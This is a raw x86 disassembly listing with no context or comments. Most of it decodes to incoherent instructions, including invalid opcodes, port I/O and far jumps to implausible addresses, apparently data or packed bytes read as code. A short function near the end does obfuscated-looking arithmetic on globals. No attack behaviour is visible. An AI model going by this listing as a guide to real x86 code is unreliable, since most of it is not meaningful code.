  4092ac:	ror    DWORD PTR [esi],1
  4092ae:	jbe    0x409267
  4092b0:	ins    BYTE PTR es:[edi],dx
  4092b1:	popa   
  4092b2:	and    DWORD PTR [ebp+0x7c],0x3730d89c
  4092b9:	and    eax,0x654f1bbf
  4092be:	lods   eax,DWORD PTR ds:[esi]
  4092bf:	lods   eax,DWORD PTR ds:[esi]
  4092c0:	and    bh,BYTE PTR [edi]
  4092c2:	mov    cl,BYTE PTR [eax+0x11]
  4092c5:	pop    edi
  4092c6:	in     al,dx
  4092c7:	add    ecx,ebx
  4092c9:	dec    ecx
  4092ca:	ins    DWORD PTR es:[edi],dx
  4092cb:	sbb    esi,DWORD PTR [ecx+eiz*1+0x51]
  4092cf:	jecxz  0x4092b1
  4092d1:	jp     0x40931a
  4092d3:	mov    edi,edx
  4092d5:	retf   
  4092d6:	out    0xb6,al
  4092d8:	scas   eax,DWORD PTR es:[edi]
  4092d9:	iret   
  4092da:	cmp    bl,cl
  4092dc:	jne    0x409359
  4092de:	add    esp,DWORD PTR [ebx+0x5a7967fe]
  4092e4:	inc    esi
  4092e5:	(bad)  
  4092e6:	sbb    eax,ebx
  4092e8:	push   es
  4092e9:	inc    esi
  4092ea:	pop    ds
  4092eb:	pop    ss
  4092ec:	push   edx
  4092ed:	mov    ds:0x853d99c,eax
  4092f2:	xor    eax,DWORD PTR [eax+edi*1-0x40]
  4092f6:	or     ebp,DWORD PTR [esi-0x3b7aba77]
  4092fc:	imul   edi,DWORD PTR [edi-0x409399],0x30
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	ss mov edi,0xe227d3ce
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x40930a
  40933a:	retf   
  40933b:	ins    DWORD PTR es:[edi],dx
  40933c:	ins    DWORD PTR es:[edi],dx
  40933d:	lock js 0x4092f4
  409340:	mov    cl,0xcd
  409342:	cmp    DWORD PTR [edx+0x1a],edx
  409345:	std    
  409346:	popa   
  409347:	gs cs inc edi
  40934a:	loop   0x409387
  40934c:	frstor [esi-0x14c80a39]
  409352:	stos   DWORD PTR es:[edi],eax
  409353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409354:	loopne 0x40937e
  409356:	and    bh,dh
  409358:	xchg   esi,eax
  409359:	cmc    
  40935a:	sub    DWORD PTR ds:0x90241fe1,ebx
  409360:	fdivr  st(1),st
  409362:	nop
  409363:	iret   
  409364:	jnp    0x409367
  409366:	and    DWORD PTR [ebx+0x6c6a3cff],esp
  40936c:	or     eax,0xe08477aa
  409371:	cmp    al,al
  409373:	stc    
  409374:	nop
  409375:	sbb    DWORD PTR [edi+0x8],0xb4ece16
  40937c:	div    DWORD PTR [eax-0x51]
  40937f:	cmp    edx,DWORD PTR [esi-0x39]
  409382:	push   0xffffff96
  409384:	sar    ch,cl
  409386:	jo     0x409400
  409388:	enter  0x4dd1,0xff
  40938c:	popf   
  40938d:	call   0x6ee524c
  409392:	jmp    0x40932d
  409394:	cld    
  409395:	test   BYTE PTR gs:[ebx+eax*1+0x18],dh
  40939a:	inc    edx
  40939b:	lock les eax,FWORD PTR [ecx+0x225afc81]
  4093a2:	movsx  ebx,WORD PTR [ebx+0x6b4bb094]
  4093a9:	cli    
  4093aa:	aam    0xb
  4093ac:	imul   esi,DWORD PTR [esi-0x50],0x632a2281
  4093b3:	scas   eax,DWORD PTR es:[edi]
  4093b4:	mul    BYTE PTR [edi+0x45]
  4093b7:	aad    0x31
  4093b9:	in     al,0xa3
  4093bb:	pop    esp
  4093bc:	xor    eax,0xc4d5628a
  4093c1:	sbb    al,0x90
  4093c3:	lock pop ebx
  4093c5:	sub    ch,ah
  4093c7:	push   ecx
  4093c8:	adc    BYTE PTR [ecx-0x67],bh
  4093cb:	ds push eax
  4093cd:	lods   al,BYTE PTR ds:[esi]
  4093ce:	fwait
  4093cf:	mov    DWORD PTR [ecx+0x39fb8552],eax
  4093d5:	pop    edx
  4093d6:	or     DWORD PTR [ebx-0x42],ecx
  4093d9:	lods   eax,DWORD PTR ds:[esi]
  4093da:	sub    bl,0xf8
  4093dd:	add    al,0xe2
  4093df:	std    
  4093e0:	adc    ebp,DWORD PTR gs:[esi+0x28bdd0af]
  4093e7:	adc    bh,bl
  4093e9:	jae    0x40941f
  4093eb:	xor    cl,BYTE PTR [esi]
  4093ed:	xchg   edi,eax
  4093ee:	loop   0x409372
  4093f0:	jbe    0x4093fa
  4093f2:	idiv   BYTE PTR [esi-0x32]
  4093f5:	imul   ebx,DWORD PTR [ebx+0x357f628b],0xffffffd7
  4093fc:	mov    ebp,0xce1a8a6e
  409401:	inc    eax
  409402:	dec    esi
  409403:	(bad)  
  409404:	(bad)  
  409405:	jmp    0xe7c7:0x136293a0
  40940c:	shl    BYTE PTR [esi+ecx*8+0xa54a4b5],cl
  409413:	dec    ebp
  409414:	sbb    edi,DWORD PTR [esi-0x79]
  409417:	push   ds
  409418:	or     eax,0x3dc3c1d1
  40941d:	bound  esi,QWORD PTR [esi]
  40941f:	dec    ebp
  409420:	inc    edi
  409421:	iret   
  409422:	jle    0x4093b8
  409424:	pop    ebp
  409425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409426:	ret    
  409427:	std    
  409428:	xchg   BYTE PTR [esi+esi*1-0x44033909],cl
  40942f:	xor    BYTE PTR gs:[ebp-0x3],0x21
  409434:	aas    
  409435:	push   edi
  409436:	xchg   BYTE PTR [esi],bl
  409438:	xchg   esp,eax
  409439:	ror    DWORD PTR [ebx+0x7d],cl
  40943c:	and    dl,BYTE PTR [ecx]
  40943e:	pop    eax
  40943f:	lock ret 0x25fe
  409443:	addr16 mov dl,0x60
  409446:	dec    ecx
  409447:	dec    eax
  409448:	mov    eax,ds:0x8fdeee5e
  40944d:	and    eax,0xb6710561
  409452:	mov    ebp,0x9c9d1b85
  409457:	mov    WORD PTR ds:0xd194da17,es
  40945d:	test   al,0x60
  40945f:	rol    BYTE PTR [ebp-0x50],0x1
  409463:	jne    0x409434
  409465:	test   al,0x41
  409467:	sti    
  409468:	(bad)  
  409469:	mov    ?,edi
  40946b:	call   0x3264:0x5ac54bb7
  409472:	adc    eax,0xb29e5e30
  409477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409478:	dec    ecx
  409479:	mov    ebx,0x3e19d2bb
  40947e:	clc    
  40947f:	outs   dx,BYTE PTR ds:[esi]
  409480:	push   ebx
  409481:	cli    
  409482:	pop    ebx
  409483:	jmp    0x4094b7
  409485:	imul   esp,DWORD PTR [eax+0x5],0x1cb12c97
  40948c:	std    
  40948d:	inc    edx
  40948e:	addr16 cwde 
  409490:	aaa    
  409491:	lock ja 0x40947b
  409494:	mov    eax,ds:0xa3a0e452
  409499:	int    0x8e
  40949b:	shl    DWORD PTR [edi-0x49],1
  40949e:	jl     0x409453
  4094a0:	and    eax,0xd79ad639
  4094a5:	xchg   ebp,eax
  4094a6:	and    DWORD PTR [edx+ecx*8-0x73991fe7],esi
  4094ad:	pop    eax
  4094ae:	aaa    
  4094af:	xor    bh,BYTE PTR [eax+0x311e12cc]
  4094b5:	xor    DWORD PTR [ebx],eax
  4094b7:	call   0x1a3a:0x29d0ec00
  4094be:	cs dec ebp
  4094c0:	mov    al,0xb4
  4094c2:	icebp  
  4094c3:	dec    ecx
  4094c4:	inc    esp
  4094c5:	fucomp st(2)
  4094c7:	dec    edx
  4094c8:	daa    
  4094c9:	adc    esi,DWORD PTR [ecx]
  4094cb:	addr16 das 
  4094cd:	mov    eax,0x3eb75dcf
  4094d2:	mov    bh,0x22
  4094d4:	xchg   DWORD PTR [edx+esi*2+0x54],ebx
  4094d8:	neg    dh
  4094da:	cs adc dl,BYTE PTR es:[edx+ecx*1]
  4094df:	jmp    FWORD PTR [esi-0x34]
  4094e2:	inc    ebp
  4094e3:	(bad)  
  4094e4:	int3   
  4094e5:	cli    
  4094e6:	clc    
  4094e7:	arpl   WORD PTR [ebx+0x2a],di
  4094ea:	call   0x6beb:0x4819ae7c
  4094f1:	push   eax
  4094f2:	(bad)  
  4094f3:	jl     0x4094eb
  4094f5:	mov    ebx,0xdbc4ca45
  4094fa:	add    bh,bl
  4094fc:	jno    0x409501
  4094fe:	out    0xf0,eax
  409500:	ins    BYTE PTR es:[edi],dx
  409501:	dec    esp
  409502:	loopne 0x409536
  409504:	mov    al,cs:0x6c192242
  40950a:	test   al,0x58
  40950c:	out    dx,al
  40950d:	pop    ss
  40950e:	das    
  40950f:	xor    eax,0x7fcbbc40
  409514:	dec    esp
  409515:	stos   BYTE PTR es:[edi],al
  409516:	mov    dh,0xad
  409518:	xchg   edi,eax
  409519:	push   ebx
  40951a:	test   DWORD PTR [ebp-0x339f13b2],ebp
  409520:	lds    edx,FWORD PTR [esi]
  409522:	in     al,dx
  409523:	lods   eax,DWORD PTR ds:[esi]
  409524:	outs   dx,DWORD PTR ds:[esi]
  409525:	dec    esp
  409526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409527:	or     DWORD PTR [eax+0xcb9464],0xffffff86
  40952e:	std    
  40952f:	jmp    0xd4e78e54
  409534:	or     BYTE PTR [ecx-0x67],ah
  409537:	push   cs
  409538:	sbb    DWORD PTR [ebx+0x10f20636],ebx
  40953e:	ret    0x1a1
  409541:	les    ebp,FWORD PTR [eax]
  409543:	sub    eax,0x95b52d73
  409548:	cdq    
  409549:	loope  0x40954b
  40954b:	rcl    BYTE PTR [edx+0x7f42107e],0x4f
  409552:	fs je  0x40955e
  409555:	xor    eax,0x8b504577
  40955a:	inc    esp
  40955b:	addr16 clc 
  40955d:	ds icebp 
  40955f:	repz pusha 
  409561:	pusha  
  409562:	ins    DWORD PTR es:[edi],dx
  409563:	and    al,0x95
  409565:	aam    0x58
  409567:	xchg   esi,eax
  409568:	ret    
  409569:	inc    esi
  40956a:	sub    eax,0x4e1e32e7
  40956f:	push   edi
  409570:	pushf  
  409571:	fwait
  409572:	daa    
  409573:	call   0x95b9:0x5d6a44a9
  40957a:	pop    ecx
  40957b:	cld    
  40957c:	fidivr WORD PTR [ebp-0x28709c9e]
  409582:	mov    esi,0x5fc24ef0
  409587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409588:	hlt    
  409589:	es and eax,0xe539cffb
  40958f:	sbb    al,0x7b
  409592:	mov    edx,0xdf4ef5cd
  409597:	cmp    DWORD PTR [ebp+0x1b],eax
  40959a:	pusha  
  40959b:	dec    esi
  40959c:	mov    eax,0x8a3bcbc3
  4095a1:	out    0xb2,eax
  4095a3:	mov    eax,ds:0x65593d2f
  4095a8:	mov    esi,0x78fcd019
  4095ad:	fisub  WORD PTR [edi]
  4095af:	push   esp
  4095b0:	mov    ecx,0x6eaddd68
  4095b5:	xchg   esi,eax
  4095b6:	add    DWORD PTR [ecx-0xc],esi
  4095b9:	push   es
  4095ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095bb:	dec    edx
  4095bc:	pushf  
  4095bd:	pop    eax
  4095be:	sub    ebp,DWORD PTR [ebx+0x3]
  4095c1:	es pop ss
  4095c3:	and    cl,BYTE PTR [edx]
  4095c5:	pop    ss
  4095c6:	sbb    DWORD PTR [esi+0x4b],ebp
  4095c9:	(bad)  
  4095ca:	int3   
  4095cb:	fdiv   st,st(4)
  4095cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ce:	imul   ebp,DWORD PTR [esi-0x24],0xffcc7cb5
  4095d5:	ja     0x40955c
  4095d7:	test   al,0xb0
  4095d9:	and    DWORD PTR [ecx],edx
  4095db:	imul   ebx,DWORD PTR [ebp+0x23b9bf6c],0x75
  4095e2:	sbb    al,0x59
  4095e4:	shr    al,1
  4095e6:	ins    BYTE PTR es:[edi],dx
  4095e7:	mov    eax,0x55c459f9
  4095ec:	jecxz  0x40963f
  4095ee:	(bad)  
  4095ef:	jmp    FWORD PTR [ebp-0x40e10850]
  4095f5:	adc    bh,BYTE PTR [esi-0x5d5c1007]
  4095fb:	(bad)  
  4095fc:	ins    DWORD PTR es:[edi],dx
  4095fd:	inc    esp
  4095fe:	sar    BYTE PTR [edi+0x5dfa66a9],cl
  409604:	adc    edi,edx
  409606:	inc    esi
  409607:	(bad)  
  409608:	push   cs
  409609:	dec    eax
  40960a:	xor    DWORD PTR [edx],eax
  40960c:	inc    ecx
  40960d:	test   eax,0xfdd19624
  409612:	into   
  409613:	and    ecx,DWORD PTR [edi+edi*4+0x36c7d9b]
  40961a:	xor    eax,0xe0a36c9e
  40961f:	jnp    0x40967f
  409621:	das    
  409622:	(bad)  
  409624:	pop    ecx
  409625:	test   eax,0x5221f542
  40962a:	arpl   WORD PTR [edx],cx
  40962c:	out    dx,eax
  40962d:	jnp    0x4095c9
  40962f:	jnp    0x40965b
  409631:	and    DWORD PTR [esi+0x7e],edi
  409634:	mov    WORD PTR [esp+edi*4-0x47ace2f7],?
  40963b:	sub    cl,BYTE PTR [esi]
  40963d:	mov    al,0x68
  40963f:	adc    eax,DWORD PTR [edx-0x3c2aa1c3]
  409645:	les    edx,FWORD PTR [esi]
  409647:	rol    DWORD PTR [ecx-0x306ae815],cl
  40964d:	bound  edx,QWORD PTR [eax]
  40964f:	cmp    DWORD PTR [esi+0x7c],0x1b
  409653:	sbb    al,0x3b
  409655:	sub    eax,0x20547206
  40965a:	mov    eax,0xb5f7988f
  40965f:	mov    bl,0x20
  409661:	std    
  409662:	scas   eax,DWORD PTR es:[edi]
  409663:	ss loope 0x409642
  409666:	test   eax,0x50ffd264
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [eax+0x2d],esp
  409688:	mov    ah,0x4d
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40965b
  409693:	fcmovnb st,st(2)
  409695:	pop    ds
  409696:	nop
  409697:	cld    
  409698:	shl    BYTE PTR [ebp-0x7fe68203],1
  40969e:	push   eax
  40969f:	and    DWORD PTR [ebx-0x66],eax
  4096a2:	out    dx,al
  4096a3:	(bad)  
  4096a4:	mul    ecx
  4096a6:	mov    ?,WORD PTR [edx-0x5a]
  4096a9:	jp     0x4096dc
  4096ab:	ja     0x409698
  4096ad:	ja     0x4096c5
  4096af:	std    
  4096b0:	jmp    0x40966f
  4096b2:	adc    DWORD PTR ds:0x7aec2bdd,edx
  4096b8:	mov    al,ds:0x214c9902
  4096bd:	inc    edx
  4096be:	xor    esp,esi
  4096c0:	sub    esp,edi
  4096c2:	mov    dl,0xd1
  4096c4:	jnp    0x4096fe
  4096c6:	mov    cl,BYTE PTR [esi-0x24]
  4096c9:	das    
  4096ca:	popa   
  4096cb:	adc    eax,0xdd1061e5
  4096d0:	inc    esp
  4096d1:	cmovb  ebx,eax
  4096d4:	jle    0x409689
  4096d6:	stos   DWORD PTR es:[edi],eax
  4096d7:	and    ecx,DWORD PTR [edi]
  4096d9:	and    BYTE PTR [ecx+eiz*1-0x4b24eb5],0x73
  4096e1:	add    edi,DWORD PTR [ebx-0x48]
  4096e4:	adc    ecx,DWORD PTR [esi+0x22]
  4096e7:	push   ecx
  4096e8:	pop    es
  4096e9:	test   DWORD PTR [edx+edi*2-0x5d],edi
  4096ed:	mov    bl,0xe4
  4096ef:	leave  
  4096f0:	cli    
  4096f1:	adc    DWORD PTR [ebx-0x7da1278c],ecx
  4096f7:	(bad)  
  4096f8:	lods   al,BYTE PTR ds:[esi]
  4096f9:	mov    ch,0x8f
  4096fb:	adc    BYTE PTR [edx-0x79],dl
  4096fe:	xor    eax,0x4540488c
  409703:	mov    ecx,DWORD PTR [edx]
  409705:	mov    al,0x66
  409707:	mov    ds:0x7f274fcd,eax
  40970c:	(bad)  
  40970d:	loopne 0x4096f6
  40970f:	shl    BYTE PTR [ebx+0x7496aae0],cl
  409715:	xchg   edi,eax
  409716:	lds    esp,FWORD PTR [edi+0x7736444]
  40971c:	es js  0x409740
  40971f:	adc    eax,0x230cc7a6
  409724:	jb     0x409736
  409726:	push   ebp
  409727:	jmp    0x95c9:0xb4d50d57
  40972e:	pop    eax
  40972f:	add    BYTE PTR [eax-0x7cc87cec],cl
  409735:	mov    eax,DWORD PTR [esi-0x585e40f2]
  40973b:	cdq    
  40973c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40973d:	pop    ebx
  40973e:	imul   edx,DWORD PTR [edx-0x58],0x6a
  409742:	mov    ebp,0xf6ea3da4
  409747:	xchg   esp,eax
  409748:	push   ds
  409749:	xchg   DWORD PTR [edx+ecx*4],eax
  40974c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40974d:	stos   DWORD PTR es:[edi],eax
  40974e:	pushf  
  40974f:	ror    BYTE PTR [ebp+0x74],cl
  409752:	retf   
  409753:	add    BYTE PTR [esi-0x6dd5a0c6],dl
  409759:	add    al,0x9
  40975b:	xor    esi,DWORD PTR [ebp+0x639db030]
  409761:	push   esp
  409762:	sbb    ah,0xef
  409765:	xchg   edi,eax
  409766:	inc    edi
  409767:	imul   ecx,DWORD PTR [edi-0x2c7006b1],0xffffffb2
  40976e:	inc    ecx
  40976f:	mov    edi,0x5a239fbb
  409774:	sbb    al,0xad
  409776:	js     0x40972c
  409778:	pop    ebx
  40977a:	add    ch,BYTE PTR [eax-0x1d]
  40977d:	imul   ebp,DWORD PTR [eax],0x19
  409780:	mov    WORD PTR [ebx+0x8e24c93],ss
  409786:	int    0xfb
  409788:	stc    
  409789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40978a:	pushf  
  40978b:	dec    ebx
  40978c:	dec    ecx
  40978d:	mov    edi,esp
  40978f:	jecxz  0x4097d1
  409791:	inc    eax
  409792:	inc    eax
  409793:	es and al,0x6e
  409796:	div    dl
  409798:	dec    ebx
  409799:	xor    dl,BYTE PTR [ecx+0x59]
  40979c:	jb     0x40979f
  40979e:	imul   ebp,DWORD PTR [eax+0x38b5d58e],0x82be903e
  4097a8:	scas   al,BYTE PTR es:[edi]
  4097a9:	xor    WORD PTR [ebp+0x507cb096],di
  4097b0:	mov    dl,0xd3
  4097b2:	cld    
  4097b3:	sub    BYTE PTR [ecx],0x95
  4097b6:	iret   
  4097b7:	cld    
  4097b8:	xchg   edx,eax
  4097b9:	dec    ebp
  4097ba:	inc    eax
  4097bb:	mov    ecx,0x40a168f
  4097c0:	adc    edx,DWORD PTR [esi-0x4e]
  4097c3:	push   ebx
  4097c4:	xchg   ebp,eax
  4097c5:	int3   
  4097c6:	pop    eax
  4097c7:	cmp    DWORD PTR [ecx+ebx*4],ecx
  4097ca:	add    al,0xbb
  4097cc:	add    BYTE PTR [ecx+0x4],al
  4097cf:	clc    
  4097d0:	stc    
  4097d1:	into   
  4097d2:	mov    bl,0x73
  4097d4:	add    eax,0x2cebb03
  4097d9:	push   ebp
  4097da:	dec    ebp
  4097db:	ret    
  4097dc:	push   ebx
  4097dd:	push   ds
  4097de:	rol    ah,cl
  4097e0:	inc    ecx
  4097e1:	dec    esi
  4097e2:	out    0x69,eax
  4097e4:	cmp    dl,cl
  4097e6:	lock icebp 
  4097e8:	aas    
  4097e9:	ret    0xaa62
  4097ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ed:	jbe    0x4097f6
  4097ef:	dec    esi
  4097f0:	scas   eax,DWORD PTR es:[edi]
  4097f1:	adc    al,0x2b
  4097f3:	cmp    ecx,DWORD PTR [edx+0x4db7e7ee]
  4097f9:	das    
  4097fa:	or     dh,BYTE PTR [ecx+0x1]
  4097fd:	push   DWORD PTR [ebx]
  4097ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409800:	aad    0xf7
  409802:	ror    BYTE PTR [edx-0x7c],0x9e
  409806:	xor    DWORD PTR [eax+0x13f733c8],ecx
  40980c:	scas   eax,DWORD PTR es:[edi]
  40980d:	lea    esp,[edx]
  40980f:	pop    eax
  409810:	fs adc edx,ebp
  409813:	xor    al,0xdd
  409815:	pop    esp
  409816:	mov    esi,eax
  409818:	mov    ah,0x92
  40981a:	sbb    eax,0x810f0500
  40981f:	daa    
  409820:	repnz rcr BYTE PTR [edi-0x9],1
  409824:	xchg   edx,eax
  409825:	adc    ecx,edx
  409827:	mov    BYTE PTR [edx-0x7b],0xe2
  40982b:	add    dh,BYTE PTR [ebp+0x25]
  40982e:	and    dh,ch
  409830:	or     al,0x0
  409832:	push   esp
  409833:	je     0x40987b
  409835:	pop    ds
  409836:	pop    ecx
  409837:	inc    ebp
  409838:	xchg   BYTE PTR [edx],ch
  40983a:	push   ds
  40983b:	(bad)  
  40983c:	fnstcw WORD PTR ds:0xd4edd566
  409842:	xchg   edi,eax
  409843:	pop    ebp
  409844:	loope  0x40980b
  409846:	xor    DWORD PTR ds:0x9a12e372,eax
  40984c:	xchg   esi,eax
  40984d:	and    esp,DWORD PTR [edi]
  40984f:	xor    DWORD PTR [edi-0xffaba14],ecx
  409855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409856:	repnz sub DWORD PTR [edx],0x71
  40985a:	mov    ds:0x74fc831c,eax
  40985f:	cdq    
  409860:	jle    0x409890
  409862:	and    DWORD PTR [eax],esp
  409864:	cdq    
  409865:	cmp    al,0x9a
  409867:	call   0x84ccfc81
  40986c:	clc    
  40986d:	mov    bh,0xf
  40986f:	call   0x55e66618
  409874:	pop    ds
  409875:	fucomi st,st(6)
  409877:	aam    0x9d
  409879:	inc    edi
  40987a:	aas    
  40987b:	xchg   ecx,eax
  40987c:	int3   
  40987d:	sbb    al,0x78
  40987f:	inc    ebp
  409880:	and    eax,0xbc4084da
  409885:	fld    QWORD PTR [ebp-0x71]
  409888:	aaa    
  409889:	push   ecx
  40988a:	cmp    BYTE PTR [ebx-0x7c],ch
  40988d:	lahf   
  40988e:	lahf   
  40988f:	push   ebx
  409890:	or     bl,BYTE PTR [ecx-0x7e]
  409893:	test   DWORD PTR ds:0x68a75b76,esp
  409899:	frstor ds:0x43a48ec2
  40989f:	repnz push esp
  4098a1:	jmp    0xe14e54f1
  4098a6:	push   esi
  4098a7:	xchg   edx,eax
  4098a8:	adc    DWORD PTR [ecx],edx
  4098aa:	sub    edx,DWORD PTR [edi]
  4098ac:	sub    BYTE PTR [ecx],al
  4098ae:	(bad)  
  4098af:	or     ch,ch
  4098b1:	mov    al,ds:0x7526b2bf
  4098b6:	xlat   BYTE PTR ds:[ebx]
  4098b7:	stc    
  4098b8:	inc    esp
  4098b9:	jb     0x4098c8
  4098bb:	cdq    
  4098bc:	mov    ds:0x5ecca3f3,eax
  4098c1:	xor    cl,BYTE PTR [eax-0x5b]
  4098c4:	(bad)  
  4098c6:	xchg   ebp,eax
  4098c7:	hlt    
  4098c8:	adc    DWORD PTR [ebx-0x15],esp
  4098cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098cc:	in     eax,0xd5
  4098ce:	in     al,dx
  4098cf:	push   si
  4098d1:	add    BYTE PTR [esi-0x45e0ec8e],ch
  4098d7:	push   ss
  4098d8:	pushf  
  4098d9:	and    dl,0xba
  4098dc:	lods   eax,DWORD PTR ds:[esi]
  4098dd:	test   BYTE PTR [edi+0x2664e50e],ch
  4098e3:	mov    ebx,ds
  4098e5:	scas   al,BYTE PTR es:[edi]
  4098e6:	lods   al,BYTE PTR ds:[esi]
  4098e7:	ins    DWORD PTR es:[edi],dx
  4098e8:	dec    esi
  4098e9:	pop    esp
  4098ea:	ficom  DWORD PTR [eax+0xc]
  4098ed:	rcr    BYTE PTR [esi-0x5b],1
  4098f0:	js     0x409903
  4098f2:	jne    0x40993c
  4098f4:	xchg   ebx,eax
  4098f5:	mov    edx,DWORD PTR [edi-0x79f14839]
  4098fb:	fcmovb st,st(5)
  4098fd:	mul    BYTE PTR [edi]
  4098ff:	nop
  409900:	or     eax,0x3da6dc7f
  409905:	sbb    eax,0xf6540c81
  40990a:	or     bl,BYTE PTR ds:0x39067f00
  409910:	test   ah,bl
  409912:	out    0xee,eax
  409914:	cwde   
  409915:	cdq    
  409916:	inc    ecx
  409917:	ss scas eax,DWORD PTR es:[edi]
  409919:	sbb    eax,0xe3978e3d
  40991e:	into   
  40991f:	rcr    DWORD PTR [ebx-0x1a],1
  409922:	inc    ebx
  409923:	in     al,0xd1
  409925:	xchg   ebp,eax
  409926:	jns    0x409971
  409928:	fwait
  409929:	(bad)  
  40992a:	and    al,0xc2
  40992c:	and    BYTE PTR [edi],dl
  40992e:	test   DWORD PTR [eax-0x2f],0xee91ed3d
  409935:	scas   eax,DWORD PTR es:[edi]
  409936:	pop    edx
  409937:	int3   
  409938:	ins    BYTE PTR es:[edi],dx
  409939:	or     DWORD PTR [ebx-0x68246c7a],ecx
  40993f:	mov    edi,0x2040a7cd
  409944:	ret    0x8c47
  409947:	add    al,0x75
  409949:	(bad)  
  40994a:	stc    
  40994b:	mov    ds:0xa88a2418,al
  409950:	ja     0x409959
  409952:	xor    al,0x2a
  409954:	adc    cl,ah
  409956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409957:	fidiv  DWORD PTR [ebp+0xd]
  40995a:	mov    ah,0xfe
  40995c:	aad    0x71
  40995e:	(bad)  
  40995f:	xor    BYTE PTR [eax+0x5781b7ea],ah
  409965:	in     al,dx
  409966:	push   ecx
  409967:	inc    ebx
  409968:	cli    
  409969:	loopne 0x40999b
  40996b:	cmc    
  40996c:	shr    DWORD PTR [edx+0x7fdaad5d],1
  409972:	ins    DWORD PTR es:[edi],dx
  409973:	in     al,dx
  409974:	push   es
  409975:	outs   dx,DWORD PTR ds:[esi]
  409976:	add    bh,BYTE PTR ds:0xb88422cc
  40997c:	test   DWORD PTR [ebp-0x14],esi
  40997f:	sbb    DWORD PTR [edx-0x78118de8],edx
  409985:	dec    esp
  409986:	lods   al,BYTE PTR ds:[esi]
  409987:	scas   eax,DWORD PTR es:[edi]
  409988:	ret    0x8a89
  40998b:	out    dx,al
  40998c:	cmp    eax,0x39b2338b
  409991:	fst    DWORD PTR [edx+ebp*4-0x1f68cacb]
  409998:	jbe    0x4099cc
  40999a:	jg     0x409a0a
  40999c:	adc    DWORD PTR [esi+0x1e2dad35],esi
  4099a2:	xor    bl,bl
  4099a4:	add    DWORD PTR [edi*2+0x2eb9db0c],ebx
  4099ab:	pop    edi
  4099ac:	sub    al,BYTE PTR [edx-0x567d30b2]
  4099b2:	arpl   dx,ax
  4099b4:	sbb    BYTE PTR [ebp+edi*8+0x2f9af37b],bh
  4099bb:	push   esp
  4099bc:	fadd   st,st(7)
  4099be:	mov    DWORD PTR [ebp*8+0x5f080172],ecx
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	idiv   DWORD PTR [eax+0x0]
  409a5b:	icebp  
  409a5c:	and    DWORD PTR [edi-0x608f8f14],eax
  409a62:	jge    0x409ad4
  409a64:	jo     0x409acf
  409a66:	dec    ecx
  409a67:	push   ebx
  409a68:	xchg   DWORD PTR ds:0x805ac3b9,eax
  409a6e:	ins    DWORD PTR es:[edi],dx
  409a6f:	ret    
  409a70:	bound  edx,QWORD PTR [edx-0x4b36f782]
  409a76:	retf   
